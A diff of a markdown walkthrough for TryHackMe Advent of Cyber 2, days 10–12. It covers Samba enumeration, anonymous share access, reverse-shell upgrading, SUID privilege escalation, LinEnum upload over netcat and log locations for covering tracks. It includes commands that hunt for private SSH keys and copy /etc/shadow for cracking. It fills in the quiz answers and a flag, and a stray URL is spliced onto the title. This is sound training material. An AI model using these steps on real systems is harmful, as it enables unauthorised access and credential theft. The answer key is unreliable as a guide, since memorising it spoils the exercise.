@@ -1,4 +1,4 @@
-﻿# Try Hack Me - Advent of Cyber 2 [2020]
+﻿https://www.techopedia.com/definition/10346/url-encoding# Try Hack Me - Advent of Cyber 2 [2020]
 ##### Get started with Cyber Security in 25 Days - Learn the basics by doing a new, beginner friendly security challenge every day leading up to Christmas.
 
 ![Watch JohnHammonds video on solving this task!](https://www.youtube.com/watch?v=BJF84oWHmok)
@@ -1314,174 +1314,201 @@ Before we begin, we're going to need to deploy two Instances:
 ##### 10.2. Today's Learning Objectives:
 
 Learn about the basics of network file sharing protocols before getting hands-on with Samba, where you will be enumerating " tbfc-smb-01" : a vulnerable Samba server to gain un-authorised access.
-Made with ❤ by CMNatic
-10.3. What is Samba & where is it Used?
 
+Made with ❤ by CMNatic
+
+##### 10.3. What is Samba & where is it Used?
 
 Whilst we learnt about one of the most commonplace protocols that are used for file-sharing on Day 10, we'll be covering an alternative technology for file-sharing that is most used within organisation/company networks. Offering encryption as standard, this technology consists of two protocols:
-SMB (Server Message Block) - Natively supported by Windows and not Linux
-NFS (Network File System) - Natively supported by Linux and not Windows
+* SMB (Server Message Block) - Natively supported by Windows and not Linux
+* NFS (Network File System) - Natively supported by Linux and not Windows
 Protocols such as SMB send "requests" and "responses" when communicating with each other, as illustrated below:
 (TechTarget., 2017)
 
 What makes Samba so popular and useful is that it removes the differences between these two protocols, meaning that the two operating systems can now share resources including files amongst each other. Simply, Samba connects to a " share " (think of this as a virtual folder) and is capable of day-to-day activities like deleting, moving or uploading files.
+
 Samba is flexible in the sense it can be useful for both you and me or businesses with thousands of employees. For example, employees can access documents from a central computer rather than each employee storing their own copy. As previously mentioned, this technology is encrypted enabling sensitive data like username and passwords used in the authentication process (and the data itself)  to be communicated between client/server securely.
+
 Unlike FTP , other IT devices such as network printers can also be shared between client/server.
-10.4. Searching for Samba Shares
+
+##### 10.4. Searching for Samba Shares
 
 We're going to be using the enum4linux tool that is already provided to you on the THM AttackBox. Let's get our hands dirty!
+1. Open a terminal prompt and navigate to enum4linux: ```cd /root/Desktop/Tools/Miscellaneous```
+2. Run enum4linux and list all the possible options we could use, take time to study these for anything
+```interesting: ./enum4linux.pl -h```
+![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-11/img1.png)
 
-
-Open a terminal prompt and navigate to enum4linux: cd /root/Desktop/Tools/Miscellaneous
-Run enum4linux and list all the possible options we could use, take time to study these for anything
-interesting: ./enum4linux.pl -h
-Note how we can use options like -S to list shares or -U (note the uppercase) to list possible users. In
-my example, I want to find out who can be used to access the server through Samba: ./enum4linux.pl -U 10.10.170.60
+Note how we can use options like ```-S``` to list shares or ```-U``` (note the uppercase) to list possible users. In
+my example, I want to find out who can be used to access the server through Samba: ```./enum4linux.pl -U 10.10.170.60```
+![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-11/img2.png)
 
 Note how enum4linux has discovered four users in my example...One of these users may have a weak password such as "password123" that we can log in with and access sensitive data as.
 1. jjohns
 2. lbutton
 3. jfrost
 4. cmnatic
-And as a result of further enumeration with enum4linux , we've discovered the following three shares!
+
+And as a result of further enumeration with enum4linux, we've discovered the following three shares!
 1. homes
 2. share1
 3. IPC$
+![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-11/img3.png)
 
-Now it's your turn, scan your Instance ( 10.10.170.60 ) to answer Question #1 and Question #2 . Remember the options that
-we can use with enum4linux.pl !
-10.5. Connecting to a Share
+Now it's your turn, scan your Instance (10.10.170.60) to answer Question #1 and Question #2 . Remember the options that
+we can use with enum4linux.pl!
+
+##### 10.5. Connecting to a Share
 We've already learnt two key pieces of information from the previous section:
 
-Usernames to authenticate as
-Shares that we can access (remembering that shares most likely contain data)
+* Usernames to authenticate as
+* Shares that we can access (remembering that shares most likely contain data)
+
 However, a very common and easy to cause vulnerability by administrators is wrong permissions. You may be able to access a share and its data without logging in at all, such as we will demonstrate below:
 1. Remember that the IP address of the Samba server is that of the Instance  you deployed ( 10.10.170.60 )
-2. Use the smbclient tool to begin accessing the Samba server and its shares, replacing " sharename " with the name of the share you wish to access: smbclient //REPLACE_INSTANCE_IP_ADDRESS/**sharename**
-3. You will be asked for a password, the easiest password is no password! We can just press " Enter " to test this theory. If successful, this means that the share requires no authentication and we are now logged in.
-For example, accessing "share1" on another device:
-|
-You can use the help command to list some of the commands you can run whilst connected to the Samba share. Here's a quick rundown of the fundamentals:
-Command
-Description
-ls
-List files and directories in the current location
-cd <directory>
-Change our working directory
-pwd
-Output the full path to our working directory
-more <filename>
-Find out more about the contents of a file. To close the open file, you press :q
-get <filename>
-Download a file from a share
-put <filename>
-Upload a file from a share
+2. Use the smbclient tool to begin accessing the Samba server and its shares, replacing "sharename" with the name of the share you wish to access: ```smbclient //REPLACE_INSTANCE_IP_ADDRESS/**sharename**```
+3. You will be asked for a password, the easiest password is no password! We can just press "Enter" to test this theory. If successful, this means that the share requires no authentication and we are now logged in.
 
+For example, accessing "share1" on another device:
+![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-11/img4.png)
+
+You can use the help command to list some of the commands you can run whilst connected to the Samba share. Here's a quick rundown of the fundamentals:
+
+| Command               | Description                                                                                     |
+|-----------------------|-------------------------------------------------------------------------------------------------|
+| ls                    | List files and directories in the current location                                              |
+| cd <directory>        | Change our working directory                                                                    |
+| pwd                   | Output the full path to our working directory                                                   |
+| more <filename>       | Find out more about the contents of a file. To close the open file, you press :q |
+| get <filename>        | Download a file from a share                                                                    |
+| put <filename>        | Upload a file from a share                                                                      |
 
 You can now proceed to answer Question #3 and Question #4
-10.6. Conclusion, where to go from here and additional Material:
 
+##### 10.6. Conclusion, where to go from here and additional Material:
 
-You've learned the fundamentals of how a very commonplace protocol used by computing devices works, and ultimately, can be leveraged through the use of enumeration and misconfiguration. With this said, you might be surprised to learn that even printers can use the protocols behind Samba. Swafox has created a lovely room on Printer Hacking 101 .
-There's no truer statement in pentesting that practice makes perfect.  Not only can you use the tools within this room, why not give a few others a try and apply your knowledge in the " Kenobi " Walkthrough room or the " Anonymous "Challenge room (CTF)
+You've learned the fundamentals of how a very commonplace protocol used by computing devices works, and ultimately, can be leveraged through the use of enumeration and misconfiguration. With this said, you might be surprised to learn that even printers can use the protocols behind Samba. Swafox has created a lovely room on [Printer Hacking 101](https://tryhackme.com/room/printerhacking101).
+
+There's no truer statement in pentesting that practice makes perfect.  Not only can you use the tools within this room, why not give a few others a try and apply your knowledge in the "[Kenobi](https://tryhackme.com/room/kenobi)" Walkthrough room or the "[Anonymous](https://tryhackme.com/room/anonymous)" Challenge room (CTF)
 ```
 Question #1 Using enum4linux, how many users are there on the Samba server (10.10.170.60)?
-> Answer format: *
+> 3
 ```
 
 ```
 Question #2 Now how many "shares" are there on the Samba server?
-> Answer format: *
+> 4
 ```
 
 ```
 Question #3 Use smbclient to try to login to the shares on the Samba server (10.10.170.60). What share doesn't require a password?
-> Answer format: **********
+> tbfc-santa
 ```
 
 ```
 Question #4 Log in to this share, what directory did ElfMcSkidy leave for Santa?
-> Answer format: ************
+> jingle-tunes
 ```
 
 ## Task 16 - [Day 11] Networking The Rogue Gnome 
 
+##### Day 11 - The Rogue Gnome: Prelude
 
-Day 11 - The Rogue Gnome: Prelude
 This is it - the moment that Elf McEager has been waiting for. It's the final exam of the Nmap course that he enlisted on during " Day 8 - What's Under the Christmas Tree? ". It looks like all that hard work of hitting the books has paid off..."Success!" Elf McEager screams..."the exploit worked! Yippeee!"
+
 Elf McEager has successfully managed to create a reverse shell from the target back to his computer. Little did he know, the real exam begins now...The last stage of the exam requires Elf McEager to escalate his privileges! He spent so much time studying Nmap cheatsheets that he's now drawing a blank...Can you help Elf McEager?
+
 To be the good guy, sometimes you gotta be the bad guy first...
-Watch DarkStar's Video On Solving This Task
 
+![Watch DarkStar's Video On Solving This Task](https://www.youtube.com/watch?v=_SMxZPne5QU)
 
-11.1. Getting Started:
+##### 11.1. Getting Started:
 Before we begin, we're going to need to deploy two Instances:
-The THM AttackBox by pressing the " Start AttackBox " button at the top-right of the page.
-The vulnerable Instance attached to this task by pressing the " Deploy " button at the top-right of this task/day.
-11.2. Today's Learning Objectives:
+* The THM AttackBox by pressing the "Start AttackBox" button at the top-right of the page.
+* The vulnerable Instance attached to this task by pressing the "Deploy" button at the top-right of this task/day.
+##### 11.2. Today's Learning Objectives:
 We're going to be learning the fundamentals of privilege escalation, what it entails and how it is used day-to-day without you even realising in legitimate circumstances. After covering the fundamentals of Linux file permissions and understanding why we may want to escalate our privileges as a pentester, we're going to put our theory into practice by abusing a common file permission misconfiguration on Linux.
+
 Made with ❤ by CMNatic
-11.3. What is Privilege Escalation?
+
+##### 11.3. What is Privilege Escalation?
 You may be surprised to find out that privilege escalation is something that you do daily. On computing systems, there is a general rule of thumb that determines how someone interacts with a computer system and the resources within it. There are two primary levels of permissions that a person may have to a computer system:
-User
-Administrator
+* User
+* Administrator
+
 Generally speaking, only Administrators can modify system settings or change the permissions of other users resources like files and folders.
+
 Users may be further divided into roles such as within a company. Staff in HR are only able to access HR documents whereas accounting staff are only able to access accounting resources.
+
 Privilege escalation is simply the process of increasing the current privileges we have to permissions above us. In the screenshot below, we are escalating our privileges to Administrator to run Command prompt on Windows 10:
+
 A normal process of privilege escalation
+
 As a pentester, we often want to escalate our privileges to that of another user or administrator to have full access to a system. We can discover and abuse misconfigurations or bugs within a system to escalate these privileges where this shouldn't be possible otherwise.
 
-
-11.4. The directions of privilege escalation
+##### 11.4. The directions of privilege escalation
 The process of escalating privileges isn't as clear-cut as going straight from a user through to administrator in most cases. Rather, slowly working our way through the resources and functions that other users can interact with.
 
-
-11.4.1. Horizontal Privilege Escalation:
+##### 11.4.1. Horizontal Privilege Escalation:
 A horizontal privilege escalation attack involves using the intended permissions of a user to abuse a vulnerability to access another user's resources who has similar permissions to you. For example, using an account with access to accounting documents to access a HR account to retrieve HR documents. As the difference in the permissions of both the Accounting and HR accounts is the data they can access, you aren't moving your privileges upwards.
 
-
-11.4.2. Vertical Privilege Escalation:
+##### 11.4.2. Vertical Privilege Escalation:
 A bit more traditional, a vertical privilege escalation attack involves exploiting a vulnerability that allows you to perform actions like commands or accessing data acting as a higher privileged account such as an administrator.
-Remember the attack you performed on " Day 1 - A Christmas Crisis "? You modified your cookie to access Santa's control panel. This is a fantastic example of a vertical privilege escalation because you were able to use your user account to access and manage the control panel. This control panel is only accessible by Santa (an administrator), so you are moving your permissions upwards in this sense.
 
+Remember the attack you performed on "Day 1 - A Christmas Crisis"? You modified your cookie to access Santa's control panel. This is a fantastic example of a vertical privilege escalation because you were able to use your user account to access and manage the control panel. This control panel is only accessible by Santa (an administrator), so you are moving your permissions upwards in this sense.
 
-11.5. Reinforcing the Breach
+##### 11.5. Reinforcing the Breach
 A common issue you will face in offensive pentesting is instability. The very nature of some exploits relies on a heavy hand of luck and patience to work. Take for example the Eternalblue exploit which conducts a series of vulnerabilities in how the Windows OS allocates and manages memory. As the exploit writes to memory in an in-proper way, there is a chance of the computer crashing. We'll showcase a means of stabilising our connection in the section below.
-Let's exploit a local copy of a DVWA (Damn Vulnerable Web App) and use a vulnerability called command injection to create a reverse connection to our device. Highlighted in red is the system command to utilise Netcat to connect back to our attacking machine:
+
+Let's exploit a local copy of a [DVWA (Damn Vulnerable Web App)](http://www.dvwa.co.uk/) and use a vulnerability called command injection to create a reverse connection to our device. Highlighted in red is the system command to utilise Netcat to connect back to our attacking machine:
+![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img2.png)
+
 Verifying a successful reverse connection, we execute two initial commands to get a bit of insight as to how we should progress:
+![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img3.png)
+
 Executing the whoami command allows us to see what the name of the account that we are executing commands as. echo $0 informs us of our shell - it is currently a /bin/sh . This is a simple shell in comparison to a " /bin/bash ". In shells like our current Netcat, we don't have many luxuries such as tab-completion and re-selecting the last command executed (using the up-arrow), but importantly, we can't use commands that ask for additional input i.e. providing SSH credentials or using the substitute user command su
+
 Modern Ubuntu installs come with python3 installed, we can spawn another shell and begin to make it interactive:
+```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
+```
+![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img4.png)
 
-There are many ways you can make your shell interactive if Python is not installed.
+There are [many ways you can make your shell interactive](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys) if Python is not installed.
 
-
-11.6. You Thought Enumeration Stopped at Nmap?
+##### 11.6. You Thought Enumeration Stopped at Nmap?
 Wrong! We were just getting started. After gaining initial access, it's essential to begin to build a picture of the internals of the machine. We can look for a plethora of information such as other services that are running, sensitive data including passwords, executable scripts of binaries to abuse and more!
+
 For example, we can use the find command to search for common folders or files that we may suspect to be on the machine:
-backups
-password
-admin
-config
-Our vulnerable machine in this example has a directory called backups containing an SSH key that we can use for authentication. This was found via: find / -name id_rsa 2> /dev/null ....Let's break this down:
-We're using find to search the volume, by specifying the root ( / ) to search for files named " id_rsa " which is the name for private SSH keys, and then using 2> /dev/null to only show matches to us.
-Can you think of any other files or folders we may want to find ?
+* backups
+* password
+* admin
+* config
 
+Our vulnerable machine in this example has a directory called backups containing an SSH key that we can use for authentication. This was found via: ```find / -name id_rsa 2> /dev/null``` ....Let's break this down:
+* We're using ```find``` to search the volume, by specifying the root (```/```) to search for files named " id_rsa " which is the name for private SSH keys, and then using ```2> /dev/null``` to only show matches to us.
 
-11.7. The "Priv Esc Checklist"
+Can you think of any other files or folders we may want to find?
+
+##### 11.7. The "Priv Esc Checklist"
 As you progress through your pentesting journey, you will begin to pick up a certain workflow for how you approach certain stages of an engagement. Whilst this workflow is truly yours, it will revolve around some fundamental steps in looking for vulnerabilities for privilege escalation.
-Determining the kernel of the machine (kernel exploitation such as Dirtyc0w)
-Locating other services running or applications installed that may be abusable (SUID & out of date software)
-Looking for automated scripts like backup scripts (exploiting crontabs)
-Credentials (user accounts, application config files..)
-Mis-configured file and directory permissions
+1. Determining the kernel of the machine (kernel exploitation such as Dirtyc0w)
+2. Locating other services running or applications installed that may be abusable (SUID & out of date software)
+3. Looking for automated scripts like backup scripts (exploiting crontabs)
+4. Credentials (user accounts, application config files..)
+5. Mis-configured file and directory permissions
+
 Checkout some checklists that can be used as a cheatsheet for the enumeration stage of privilege escalation:
-g0tmi1k
-payatu
-PayloadAllTheThings
-11.8. Vulnerability: SUID 101
-For today's material, we're going to be showcasing the resource that is GTFOBins and explaining how the misconfigured permissions of applications can be exploited to escalate our privileges to an administrator.
+* [g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation)
+* [payatu](https://payatu.com/guide-linux-privilege-escalation)
+* [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#linux---privilege-escalation)
+
+##### 11.8. Vulnerability: SUID 101
+For today's material, we're going to be showcasing the resource that is [GTFOBins](https://gtfobins.github.io/) and explaining how the misconfigured permissions of applications can be exploited to escalate our privileges to an administrator.
+
 Firstly, this begs the question...what is SUID exactly? Well, let's get on the same page by detailing how permissions work in Linux exactly. A benefit of Linux is its granularity in file permissions - they are, however, rather intimidating to approach. When performing commands like ls -l to list the permissions of our current directory:
+![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img5.png)
+
 [A]         [B]     [C]
 drwxrwxr-x 2 cmnatic cmnatic 4096 Dec 8 18:33 exampledir
 drwxrwxr-x 2 cmnatic cmnatic 4096 Dec 8 18:33 exampledir2
@@ -1489,114 +1516,113 @@ drwxrwxr-x 2 cmnatic cmnatic 4096 Dec 8 18:33 exampledir3
 -rw-rw-r-- 1 cmnatic cmnatic 0 Dec 8 18:33 examplefile
 -rw-rw-r-- 1 cmnatic cmnatic 0 Dec 8 18:33 examplefile2
 -rw-rw-r-- 1 cmnatic cmnatic 0 Dec 8 18:33 examplefile3
-Our directory has three directories " exampledir [3]" and three files " examplefile [3]". I've listed the four columns of interest here:
-Column Letter
-Description
-Example
-[A]
-filetype ( d is a directory - is a file) and the user and group permissions " r " for reading, " w " for write and " x " for executing.
 
-A file with -rw-rw-r-- is read/write to the user and group only. However, every other user has read access only
+Our directory has three directories "exampledir [3]" and three files "examplefile [3]". I've listed the four columns of interest here:
 
-[B]
-
-the user who owns the file
-
-cmnatic (system user)
-
-[C]
-
-the group (of users) who owns the file
-
-sudoers group
-
+| Column Letter | Description                                                                                                                                     | Example                                                                                                                   |
+|---------------|-------------------------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------------------|
+| [A]           | filetype (d is a directory - is a file) and the user and group permissions "r" for reading, "w" for write and "x" for executing. | A file with -rw-rw-r-- is read/write to the user and group only. However, every other user has read access only |
+| [B]           | the user who owns the file                                                                                                                      | cmnatic (system user)                                                                                                     |
+| [C]           | the group (of users) who owns the file                                                                                                          | sudoers group                                                                                                             |
 
 At the moment, the "examplefiles" are not executable as there is no " x " present for either the user or group. When setting the executable permission ( chmod +x filename ), this value changes (note the " x " in the snippet below -rw x rw x r):
+```bash
 -rwxrwxr-x 1 cmnatic cmnatic 0 Dec 8 18:43 backup.sh
+```
+
 Normally, executables and commands (commands are just shortcuts to executables) will execute as the user who is running them (assuming they have the file permissions to do so.) This is why some commands such as changing a user's password require sudo in front of them. The sudo allows you to execute something with the permissions as root (the most privileged user). Users who can use sudo are called "sudoers" and are listed in /etc/sudoers (we can use this to help identify valuable users to us).
+
 SUID is simply a permission added to an executable that does a similar thing as sudo. However, instead, allows users to run the executable as whoever owns it as demonstrated below:
 
-
-Filename
-File Owner
-User who is executing the file
-User that the file is executed as
-ex1
-root
-cmnatic
-root
-ex2
-cmnatic
-cmnatic
-cmnatic
-ex3
-service
-danny
-service
-
+| Filename | File Owner | User who is executing the file | User that the file is executed as |
+|----------|------------|--------------------------------|-----------------------------------|
+| ex1      | root       | cmnatic                        | root                              |
+| ex2      | cmnatic    | cmnatic                        | cmnatic                           |
+| ex3      | service    | danny                          | service                           |
 
 Suddenly with the introduction of SUID, users no longer have to be a sudoer to run an executable as root. This can be legitimately used to allow applications that specific privileges to run that another user can't have.
 
-
-11.9. Abusing SUID (GTFOBins)
+##### 11.9. Abusing SUID (GTFOBins)
 Now that we understand why executables with this SUID permission are so enticing, let's begin to learn how to find these and understand the capabilities we can do with some of these executables. At the surface, SUID isn't inherently insecure. It's only when you factor in the misconfiguration of permissions (and given the complexity on Linux - is very easy to do); Administrators don't adhere to the rule of least privileges when troubleshooting.
-Executables that are capable of interacting with the operating system such as reading/writing files or creating shells are goldmines for us. Thankfully, GTFOBins is a website that lists a majority of applications that do such actions for us. Let's set the SUID on the cp command that is used to copy files with chmod u+s /usr/bin/cp
+
+Executables that are capable of interacting with the operating system such as reading/writing files or creating shells are goldmines for us. Thankfully, [GTFOBins is a website](https://gtfobins.github.io/) that lists a majority of applications that do such actions for us. Let's set the SUID on the cp command that is used to copy files with chmod u+s /usr/bin/cp
+
 Note how the cp executable is owned by "root" and now has the SUID permission set:
+```bash
 cmnatic@docker-ubuntu-s-1vcpu-1gb-lon1-01:~$ ls -al /usr/bin | grep " cp "
 -rwsr-xr-x 1 root root 153976 Sep 5 2019 cp
+```
 The cp command will now be executed as root - meaning we can copy any file on the system. Some locations may be of interest to us:
-copying the contents of other user directories (i.e. bash history, ssh keys, user.txt)
-copying the contents of the " /root " directory (i.e. "/root/flag.txt" )
-copy the " /etc/passwd " & " /etc/shadow " files for password cracking
-Let's confirm this by using find to search the machine for executables with the SUID permission set: find / -perm -u=s -type f 2>/dev/null
-And now using cp to copy the contents of "/root" into our directory (" /home/cmnatic "):
+* copying the contents of other user directories (i.e. bash history, ssh keys, user.txt)
+* copying the contents of the "/root" directory (i.e. "/root/flag.txt" )
+* copy the "/etc/passwd" & "/etc/shadow" files for password cracking
 
+Let's confirm this by using find to search the machine for executables with the SUID permission set: ```find / -perm -u=s -type f 2>/dev/null```
+![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img8.png)
 
+And now using cp to copy the contents of "/root" into our directory ("/home/cmnatic"):
+![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img9.png)
 
-11.10. Introducing Enumeration Scripts (Doing the leg work for us...)
+##### 11.10. Introducing Enumeration Scripts (Doing the leg work for us...)
 Fortunately for us, there are many enumeration scripts available to use that automate some of the enumeration processes for us. We can download these onto our own machine and use a few methods to upload them to our vulnerable target instance. Bear in mind that vulnerable target Instances that you deploy on TryHackMe do not have internet access, so we must use our own attacking machine that is connected to the THM network.
-A great script that is essential to anyone's toolkit is "LinEnum" that is available for download from here . LinEnum enumerates the target machine for us, detailing and collating useful information such as kernel versions, permissions to any executables or files that are outside of the users home directory - and a whole plethora more!
+
+A great script that is essential to anyone's toolkit is "LinEnum" that is available for download from [here](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh). LinEnum enumerates the target machine for us, detailing and collating useful information such as kernel versions, permissions to any executables or files that are outside of the users home directory - and a whole plethora more!
+
 The problem with this? It's easy to get lost within it all. Enumeration scripts often return lots of information that is often not all that useful to us; It's important to understand how these enumeration scripts work so as not to rely on them. However, these scripts make privilege escalation that much more approachable for beginners.
-11.10.1. Let's download the LinEnum script to our own machine using wget :
 
-11.10.2. Let's use Python3 to turn our machine into a web server to serve the LinEnum.sh script to be downloaded onto the target machine. Make sure you run this command in the same directory that you downloaded LinEnum.sh to: python3 -m http.server 8080
+##### 11.10.1. Let's download the [LinEnum](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) script to our own machine using wget:
+![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/e1.png)
 
-11.10.3. We need to upload this to the vulnerable Instance (10.10.170.60) whilst ensuring that our own device is connected to the THM network. There are many ways this can be done which will depend on the vulnerable Instance you are attacking; the vulnerable Instance may not have tools such as wget , so alternatives will need to be used.
-11.10.3.1. Navigate to a directory that we will have write permission to. The /tmp directory allows all users to write to it - so we will use this.
-11.10.3.2. Using wget on the vulnerable Instance:
+##### 11.10.2. Let's use Python3 to turn our machine into a web server to serve the LinEnum.sh script to be downloaded onto the target machine. Make sure you run this command in the same directory that you downloaded LinEnum.sh to: python3 -m http.server 8080
+![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/e2.png)
+![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/e3.png)
 
-11.10.3.3. Using netcat :
-11.10.3.3.1. Setup netcat on the vulnerable Instance to listen for an incoming file: nc -l -p 1337 > LinEnum.sh
+##### 11.10.3. We need to upload this to the vulnerable Instance (10.10.170.60) whilst ensuring that our own device is connected to the THM network. There are many ways this can be done which will depend on the vulnerable Instance you are attacking; the vulnerable Instance may not have tools such as wget , so alternatives will need to be used.
 
-11.10.3.3.2. Setup netcat on our own machine to send a file: nc -w -3 10.10.170.60 1337 < LinEnum.sh
+##### 11.10.3.1. Navigate to a directory that we will have write permission to. The /tmp directory allows all users to write to it - so we will use this.
 
-11.10.3.4. Add the execution permission to LinEnum.sh on the vulnerable Instance : chmod +x LinEnum.sh
-11.10.3.5. Execute LinEnum.sh on the vulnerable Instance: ./LinEnum.sh
+##### 11.10.3.2. Using wget on the vulnerable Instance:
+![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/e4.png)
 
+##### 11.10.3.3. Using netcat:
 
+##### 11.10.3.3.1. Setup netcat on the vulnerable Instance to listen for an incoming file: nc -l -p 1337 > LinEnum.sh
+![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/e6.png)
 
-11.11. Covering our Tracks
+##### 11.10.3.3.2. Setup netcat on our own machine to send a file: nc -w -3 10.10.170.60 1337 < LinEnum.sh
+![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/e7.png)
+
+##### 11.10.3.4. Add the execution permission to LinEnum.sh on the vulnerable Instance : chmod +x LinEnum.sh
+
+##### 11.10.3.5. Execute LinEnum.sh on the vulnerable Instance: ./LinEnum.sh
+![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/e5.png)
+
+##### 11.11. Covering our Tracks
 The final stages of penetration testing involve setting up persistence and covering our tracks. For today's material, we'll detail the later as this is not mentioned nearly enough.
-During a pentesting engagement, you will want to try to avoid detection from the administrators & engineers of your client wherever within the permitted scope of the pentesting engagement. Activities such as logging in, authentication and uploading/downloading files are logged by services and the system itself.
-On Debian and Ubuntu, the majority of these are left within the " /var/log directory and often require administrative privileges to read and modify. Some log files of interest:
-" /var/log/auth.log " (Attempted logins for SSH, changes too or logging in as system users:)
-" /var/log/syslog " (System events such as firewall alerts:)
-" /var/log/<service/"
-For example, the access logs of apache2
-/var/log/apache2/access.log"
 
-11.12. Challenge
+During a pentesting engagement, you will want to try to avoid detection from the administrators & engineers of your client wherever within the permitted scope of the pentesting engagement. Activities such as logging in, authentication and uploading/downloading files are logged by services and the system itself.
+
+On Debian and Ubuntu, the majority of these are left within the **/var/log** directory and often require administrative privileges to read and modify. Some log files of interest:
+* **/var/log/auth.log** (Attempted logins for SSH, changes too or logging in as system users:)
+* **/var/log/syslog** (System events such as firewall alerts:)
+* **/var/log/<service/**
+* For example, the access logs of apache2
+  * **/var/log/apache2/access.log**
+
+##### 11.12. Challenge
 Ensure that you have deployed the instance attached to this task and take note of the IP address (10.10.170.60). Answer Question #1 and #2 before proceeding to log into the vulnerable instance. You have already been provided with the credentials to use to log into the vulnerable instance in Question #3.
+
 Apply your newly found knowledge from this task to escalate your privileges! Study the hints carefully if needed - everything to complete this day has been discussed throughout today's task.
-Want to hone-in your skills? I highly recommend checking out the new " Privilege escalation and shells " module on TryHackMe. Modules provide a guided-style of learning for all users, similarly to the subscriber Pathways .
+
+Want to hone-in your skills? I highly recommend checking out the new "[Privilege escalation and shells](https://tryhackme.com/module/privilege-escalation-and-shells)" module on TryHackMe. [Modules](https://tryhackme.com/hacktivities) provide a guided-style of learning for all users, similarly to the subscriber [Pathways](https://tryhackme.com/paths).
 ```
 What type of privilege escalation involves using a user account to execute commands as an administrator?
-> Answer format: ********
+> Vertical
 ```
 
 ```
 What is the name of the file that contains a list of users who are a part of the sudo group?
-> Answer format: *******
+> sudoers
 ```
 
 ```
@@ -1611,99 +1637,253 @@ Enumerate the machine for executables that have had the SUID permission set. Loo
 
 ```
 Use this executable to launch a system shell as root. What are the contents of the file located at /root/flag.txt?
-> Answer format: ***{*****************}
+> thm{2fb10afe933296592}
 ```
 
 ## Task 17 - [Day 12] Networking Ready, set, elf. 
-
  
-Day 12: Ready, set, elf. - Prelude:
+##### Day 12: Ready, set, elf. - Prelude:
 Christmas is fast approaching, yet, all remain silent at The Best Festival Company (TBFC). What gives?! The cheek of those elves - slacking at the festive period! Santa has no time for slackers in his workshop. After all, the sleigh won't fill itself, nor will the good and naughty lists be sorted. Santa has tasked you, Elf McEager, with whacking those elves back in line.
-Watch DarkStar's video on solving this task!
 
+![Watch DarkStar's video on solving this task!](https://www.youtube.com/watch?v=6DOp2Fn1AsQ)
 
-12.1. Getting Started:
+##### 12.1. Getting Started:
 
 Before we begin, we're going to need to deploy two Instances:
-The THM AttackBox by pressing the " Start AttackBox " button at the top-right of the page.
-The vulnerable Instance attached to this task by pressing the " Deploy " button at the top-right of this task/day
-12.2. Todays Learning Objectives:
+1. The THM AttackBox by pressing the "Start AttackBox" button at the top-right of the page.
+2. The vulnerable Instance attached to this task by pressing the "Deploy" button at the top-right of this task/day
+
+##### 12.2. Todays Learning Objectives:
 We're going to be applying some of the skills and techniques we previously explored in this year's Advent of Cyber. Let's put on our enumeration caps, crack our knuckles and get hands-on with learning about, discovering and exploiting an interesting functionality of web servers.
 
 Made with ❤ by CMNatic
 
-
-12.3. Vulnerability...reveal yourself!
+##### 12.3. Vulnerability...reveal yourself!
 
 As an application's lifecycle continues, so does its version numbering. Applications contain seemingly innocent hallmarks of information such as version numbering. Known as information disclosure, these nuggets of information are handed to us by the server through error messages such as in the following screenshot, HTTP headers or even on the website itself.
-An attacker can use knowledgebases such as Rapid7 , AttackerKB , MITRE or Exploit-DB to look for vulnerabilities associated with the version number of that application. Vulnerabilities are attributed by a CVE number. You can learn more about these in MuirlandOracle's Intro to Research room .
 
+An attacker can use knowledgebases such as [Rapid7](http://rapid7.com/), [AttackerKB](https://attackerkb.com/), [MITRE](https://cve.mitre.org/cve/) or [Exploit-DB](http://exploit-db.com/) to look for vulnerabilities associated with the version number of that application. Vulnerabilities are attributed by a CVE number. You can learn more about these in [MuirlandOracle's Intro to Research room](https://tryhackme.com/room/introtoresearch).
 
-
-
-12.4. Everything CGI (And no, not the movie kind...)
+##### 12.4. Everything CGI (And no, not the movie kind...)
 
 As you may have discovered throughout the "Web" portion of the event, webservers don't just display websites...They are capable of interacting with the operating system directly. The Common Gateway Interface or CGI for short is a standard means of communicating and processing data between a client such as a web browser to a web server.
 
 Simply, this technology facilitates interaction with programmes such as Python script files, C++ and Java application, or system commands all within the browser - as if you were executing it on the command line.
 
-( America Online., 1999 )
+![](https://www.tcl.tk/man/aolserver3.0/cgi.gif)
+([America Online., 1999](https://www.tcl.tk/man/aolserver3.0/cgi-ch1.htm))
+
 Despite their age, CGI scripts are still relied upon from devices such as embedded computers to IoT devices, Routers, and the likes, who can't run complex frameworks like PHP or Node.
 
-
-12.5. The Nitty Gritty
+##### 12.5. The Nitty Gritty
 
 Whilst CGI has the right intentions and use cases, this technology can quickly be abused by people like us! The commonplace for CGI scripts to be stored is within the /cgi-bin/ folder on a webserver. Take, for example, this systeminfo.sh file that displays the date, time and the user the webserver is running as:
+![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-13/img3.png)
+
 When navigating to the location of this script using our browser, the script is executed on the web server, the resulting output of this is then displayed to us. How could we use this?
-12.6. As We've Demonstrated...
+
+##### 12.6. As We've Demonstrated...
 
